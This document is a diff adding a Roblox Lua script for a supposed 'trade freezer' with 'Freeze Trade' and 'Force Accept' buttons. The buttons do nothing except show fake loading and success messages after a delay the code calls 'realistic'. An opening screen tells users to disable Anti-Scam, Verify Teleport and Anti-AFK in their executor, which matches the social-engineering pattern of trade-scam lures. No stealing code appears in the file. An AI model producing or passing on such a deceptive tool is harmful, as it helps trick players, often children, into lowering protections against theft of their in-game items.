@@ -1,0 +1,247 @@
+--// Services
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TradeFreezerUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- REMINDER GUI
+local ReminderFrame = Instance.new("Frame")
+ReminderFrame.Size = UDim2.new(0.45, 0, 0.4, 0)
+ReminderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+ReminderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+ReminderFrame.BackgroundColor3 = Color3.fromRGB(25, 50, 25)
+ReminderFrame.BorderSizePixel = 0
+ReminderFrame.Parent = ScreenGui
+Instance.new("UICorner", ReminderFrame).CornerRadius = UDim.new(0,12)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -20, 0.2, 0)
+Title.Position = UDim2.new(0,10,0,0)
+Title.BackgroundTransparency = 1
+Title.Text = "⚠ Turn off all on Delta settings ⚠"
+Title.TextColor3 = Color3.fromRGB(120,255,120)
+Title.Font = Enum.Font.GothamBold
+Title.TextScaled = true
+Title.TextWrapped = true
+Title.Parent = ReminderFrame
+
+local Instructions = Instance.new("TextLabel")
+Instructions.Size = UDim2.new(1, -40, 0.4, 0)
+Instructions.Position = UDim2.new(0,20,0.2,0)
+Instructions.BackgroundTransparency = 1
+Instructions.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n4. Make sure you followed the steps."
+Instructions.TextColor3 = Color3.fromRGB(180,255,180)
+Instructions.Font = Enum.Font.Gotham
+Instructions.TextScaled = true
+Instructions.TextXAlignment = Enum.TextXAlignment.Left
+Instructions.TextYAlignment = Enum.TextYAlignment.Top
+Instructions.TextWrapped = true
+Instructions.Parent = ReminderFrame
+
+local CheckBox = Instance.new("TextButton")
+CheckBox.Size = UDim2.new(0.08,0,0.12,0)
+CheckBox.Position = UDim2.new(0.05,0,0.65,0)
+CheckBox.BackgroundColor3 = Color3.fromRGB(30,80,30)
+CheckBox.Text = ""
+CheckBox.Parent = ReminderFrame
+Instance.new("UICorner", CheckBox).CornerRadius = UDim.new(0,4)
+
+local CheckLabel = Instance.new("TextLabel")
+CheckLabel.Size = UDim2.new(0.8,0,0.12,0)
+CheckLabel.Position = UDim2.new(0.15,0,0.65,0)
+CheckLabel.BackgroundTransparency = 1
+CheckLabel.Text = "After disabling, press Confirm to continue."
+CheckLabel.TextColor3 = Color3.fromRGB(180,255,180)
+CheckLabel.Font = Enum.Font.Gotham
+CheckLabel.TextScaled = true
+CheckLabel.TextXAlignment = Enum.TextXAlignment.Left
+CheckLabel.Parent = ReminderFrame
+
+local ConfirmBtn = Instance.new("TextButton")
+ConfirmBtn.Size = UDim2.new(0.5,0,0.15,0)
+ConfirmBtn.Position = UDim2.new(0.25,0,0.82,0)
+ConfirmBtn.BackgroundColor3 = Color3.fromRGB(50,150,50)
+ConfirmBtn.Text = "Confirm"
+ConfirmBtn.TextColor3 = Color3.fromRGB(255,255,255)
+ConfirmBtn.Font = Enum.Font.GothamBold
+ConfirmBtn.TextScaled = true
+ConfirmBtn.AutoButtonColor = true
+ConfirmBtn.Parent = ReminderFrame
+Instance.new("UICorner", ConfirmBtn).CornerRadius = UDim.new(0,8)
+
+-- Checkbox logic
+local checked = false
+CheckBox.MouseButton1Click:Connect(function()
+	checked = not checked
+	if checked then
+		CheckBox.BackgroundColor3 = Color3.fromRGB(80,220,80)
+		CheckLabel.TextColor3 = Color3.fromRGB(160,255,160)
+		ConfirmBtn.BackgroundColor3 = Color3.fromRGB(80,180,80)
+		ConfirmBtn.TextColor3 = Color3.fromRGB(255,255,255)
+	else
+		CheckBox.BackgroundColor3 = Color3.fromRGB(30,80,30)
+		CheckLabel.TextColor3 = Color3.fromRGB(180,255,180)
+		ConfirmBtn.BackgroundColor3 = Color3.fromRGB(50,150,50)
+		ConfirmBtn.TextColor3 = Color3.fromRGB(255,255,255)
+	end
+end)
+
+-- MAIN GUI
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0,400,0,280)
+MainFrame.Position = UDim2.new(0.5,-200,0.5,-140)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20,60,20)
+MainFrame.Visible = false
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,12)
+
+-- Make draggable
+local function makeDraggable(frame)
+	local dragging, dragInput, dragStart, startPos
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	frame.InputChanged:Connect(function(input)
+		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+			local delta = input.Position - dragStart
+			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+				startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		end
+	end)
+end
+makeDraggable(MainFrame)
+
+-- Search Box
+local SearchBox = Instance.new("TextBox")
+SearchBox.Size = UDim2.new(0.65,-10,0,35)
+SearchBox.Position = UDim2.new(0,20,0,20)
+SearchBox.PlaceholderText = "Enter username..."
+SearchBox.BackgroundColor3 = Color3.fromRGB(40,90,40)
+SearchBox.TextColor3 = Color3.fromRGB(255,255,255)
+SearchBox.Font = Enum.Font.Gotham
+SearchBox.TextSize = 16
+SearchBox.Parent = MainFrame
+Instance.new("UICorner", SearchBox).CornerRadius = UDim.new(0,6)
+
+local SearchBtn = Instance.new("TextButton")
+SearchBtn.Size = UDim2.new(0.3,-10,0,35)
+SearchBtn.Position = UDim2.new(0.7,0,0,20)
+SearchBtn.BackgroundColor3 = Color3.fromRGB(50,200,50)
+SearchBtn.Text = "Search"
+SearchBtn.TextColor3 = Color3.fromRGB(255,255,255)
+SearchBtn.Font = Enum.Font.GothamBold
+SearchBtn.TextSize = 16
+SearchBtn.Parent = MainFrame
+Instance.new("UICorner", SearchBtn).CornerRadius = UDim.new(0,6)
+
+local Avatar = Instance.new("ImageLabel")
+Avatar.Size = UDim2.new(0,100,0,100)
+Avatar.Position = UDim2.new(0.5,-50,0,70)
+Avatar.BackgroundColor3 = Color3.fromRGB(50,90,50)
+Avatar.Image = ""
+Avatar.Parent = MainFrame
+Instance.new("UICorner", Avatar).CornerRadius = UDim.new(0,8)
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(1,-40,0,30)
+StatusLabel.Position = UDim2.new(0,20,1,-110)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = ""
+StatusLabel.TextColor3 = Color3.fromRGB(180,255,180)
+StatusLabel.Font = Enum.Font.GothamBold
+StatusLabel.TextScaled = true
+StatusLabel.TextWrapped = true
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+StatusLabel.Parent = MainFrame
+-- Confirm button action
+ConfirmBtn.MouseButton1Click:Connect(function()
+	if checked then
+		ReminderFrame.Visible = false
+		MainFrame.Visible = true
+	end
+end)
+
+-- Search function (shows avatar)
+SearchBtn.MouseButton1Click:Connect(function()
+	local name = SearchBox.Text
+	if name ~= "" then
+		local userId
+		pcall(function()
+			userId = Players:GetUserIdFromNameAsync(name)
+		end)
+		if userId then
+			Avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
+			StatusLabel.Text = "User found!"
+			StatusLabel.TextColor3 = Color3.fromRGB(160,255,160)
+		else
+			Avatar.Image = ""
+			StatusLabel.Text = "User not found!"
+			StatusLabel.TextColor3 = Color3.fromRGB(255,100,100)
+		end
+	else
+		StatusLabel.Text = "Enter a username first."
+		StatusLabel.TextColor3 = Color3.fromRGB(255,200,100)
+	end
+end)
+
+-- Freeze Trade button
+local FreezeBtn = Instance.new("TextButton")
+FreezeBtn.Size = UDim2.new(0.45,-15,0,40)
+FreezeBtn.Position = UDim2.new(0,20,1,-60)
+FreezeBtn.BackgroundColor3 = Color3.fromRGB(200,80,80)
+FreezeBtn.Text = "Freeze Trade"
+FreezeBtn.TextColor3 = Color3.fromRGB(255,255,255)
+FreezeBtn.Font = Enum.Font.GothamBold
+FreezeBtn.TextSize = 16
+FreezeBtn.Parent = MainFrame
+Instance.new("UICorner", FreezeBtn).CornerRadius = UDim.new(0,8)
+
+-- Force Accept button
+local AcceptBtn = Instance.new("TextButton")
+AcceptBtn.Size = UDim2.new(0.45,-15,0,40)
+AcceptBtn.Position = UDim2.new(0.55,0,1,-60)
+AcceptBtn.BackgroundColor3 = Color3.fromRGB(80,200,120)
+AcceptBtn.Text = "Force Accept"
+AcceptBtn.TextColor3 = Color3.fromRGB(255,255,255)
+AcceptBtn.Font = Enum.Font.GothamBold
+AcceptBtn.TextSize = 16
+AcceptBtn.Parent = MainFrame
+Instance.new("UICorner", AcceptBtn).CornerRadius = UDim.new(0,8)
+
+-- Loading effect for buttons
+local function Loading(button, doneText, statusText, statusColor)
+	button.AutoButtonColor = false
+	local original = button.Text
+	button.Text = "Loading..."
+	StatusLabel.Text = statusText
+	StatusLabel.TextColor3 = statusColor
+	wait(1.5) -- realistic delay
+	button.Text = doneText
+	button.AutoButtonColor = true
+end
+
+FreezeBtn.MouseButton1Click:Connect(function()
+	Loading(FreezeBtn,"Freeze Trade","Freezing trade... please wait",Color3.fromRGB(160,255,160))
+	StatusLabel.Text = "Trade Frozen"
+	StatusLabel.TextColor3 = Color3.fromRGB(120,255,120)
+end)
+
+AcceptBtn.MouseButton1Click:Connect(function()
+	Loading(AcceptBtn,"Force Accept","Accepting trade... please wait",Color3.fromRGB(160,255,160))
+	StatusLabel.Text = "Trade Accepted"
+	StatusLabel.TextColor3 = Color3.fromRGB(80,255,120)
+end)
